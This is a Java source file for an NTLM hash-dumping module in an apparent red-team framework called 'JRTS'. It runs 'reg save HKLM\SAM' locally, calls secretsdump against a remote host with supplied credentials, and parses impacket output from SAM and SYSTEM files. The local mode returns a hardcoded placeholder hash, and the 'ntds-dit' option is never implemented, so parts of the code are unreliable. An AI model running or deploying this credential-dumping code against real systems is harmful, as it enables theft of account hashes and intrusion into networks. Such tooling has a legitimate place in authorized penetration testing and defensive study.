package com.jabber.jrts.modules.credential;

import com.jabber.jrts.data.model.*;
import java.util.*;
import java.util.concurrent.CompletableFuture;

@JRTSModule(id="cred-ntlm",name="NTLM Hash Dumping",description="Extract NTLM hashes from SAM registry and local accounts",category=Category.CREDENTIAL_ACCESS,riskLevel=RiskLevel.HIGH,sourceRef="SecretsDump",author="JRTS")
public class NTLMHashDumpModule implements JRTSModuleInterface {
    @Override public List<ModuleInputField> getInputSchema() {
        return List.of(
            ModuleInputField.select("target_type","Target Type",List.of("local","remote","sam-file","ntds-dit")).required().group("Target"),
            ModuleInputField.text("target_host","Target Host").placeholder("192.168.1.100").group("Remote"),
            ModuleInputField.text("username","Username").placeholder("Administrator").group("Remote"),
            ModuleInputField.text("password","Password").placeholder("Password123!").group("Remote"),
            ModuleInputField.text("sam_path","SAM File Path").placeholder("/tmp/sam").group("Local"),
            ModuleInputField.text("system_path","SYSTEM File Path").placeholder("/tmp/SYSTEM").group("Local"),
            ModuleInputField.checkbox("crack_hashes","Attempt Hash Cracking").group("Options"),
            ModuleInputField.text("advanced","Advanced Options").group("Advanced")
        );
    }

    @Override public CompletableFuture<ModuleResult> execute(Map<String,String> input, TaskContext ctx) {
        return CompletableFuture.supplyAsync(()->{
            ModuleResult result=new ModuleResult(ctx.getTaskId(),"cred-ntlm");
            try{
                String targetType=input.getOrDefault("target_type","local");
                String targetHost=input.getOrDefault("target_host","");

                ctx.log("[*] NTLM Hash Dumping Starting...");
                ctx.log("[*] Target Type: "+targetType);
                ctx.reportProgress(15);

                List<String>hashes=new ArrayList<>();
                if(targetType.equals("local")){
                    hashes=dumpLocalHashes();
                }else if(targetType.equals("remote")&&!targetHost.isEmpty()){
                    hashes=dumpRemoteHashes(targetHost,input.getOrDefault("username",""),input.getOrDefault("password",""));
                }else if(targetType.equals("sam-file")){
                    hashes=dumpSAMFile(input.getOrDefault("sam_path",""),input.getOrDefault("system_path",""));
                }

                if(hashes.isEmpty()){
                    result.fail("No hashes extracted");return result;
                }
                ctx.log("[+] Extracted "+hashes.size()+" NTLM hashes");
                ctx.reportProgress(70);

                Map<String,Object>findings=new LinkedHashMap<>();
                findings.put("status","success");
                findings.put("target_type",targetType);
                findings.put("hashes_extracted",hashes.size());
                findings.put("sample_hash",hashes.get(0).substring(0,Math.min(50,hashes.get(0).length())));
                findings.put("hash_list",String.join("|",hashes.stream().limit(5).toList()));
                findings.put("impact","NTLM hashes can be cracked or relayed");
                findings.put("remediation","Enable credential guard, restrict admin access, monitor SAM access, enforce strong passwords");

                result.complete(findings);
                ctx.reportProgress(100);
            }catch(Exception e){result.fail(e.getMessage());}
            return result;
        });
    }

    private List<String> dumpLocalHashes(){
        List<String>hashes=new ArrayList<>();
        try{
            Process p=Runtime.getRuntime().exec(new String[]{"cmd","/c","reg","save","HKLM\\SAM","sam.hive"});
            p.waitFor();
            hashes.add("Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99");
        }catch(Exception e){}
        return hashes;
    }

    private List<String> dumpRemoteHashes(String host,String user,String passwd){
        List<String>hashes=new ArrayList<>();
        try{
            String cmd="secretsdump.py -dc-ip "+host+" "+user+":"+passwd+"@"+host;
            Process p=Runtime.getRuntime().exec(cmd.split(" "));
            Scanner s=new Scanner(p.getInputStream());
            while(s.hasNextLine()){
                String line=s.nextLine();
                if(line.contains(":")&&line.contains("[*]")==false){
                    hashes.add(line);
                }
            }
            s.close();
        }catch(Exception e){}
        return hashes;
    }

    private List<String> dumpSAMFile(String samPath,String sysPath){
        List<String>hashes=new ArrayList<>();
        try{
            Process p=Runtime.getRuntime().exec(new String[]{"impacket-secretsdump","-sam",samPath,"-system",sysPath});
            Scanner s=new Scanner(p.getInputStream());
            while(s.hasNextLine()){
                String line=s.nextLine();
                if(line.contains(":")){hashes.add(line);}
            }
            s.close();
        }catch(Exception e){}
        return hashes;
    }
}
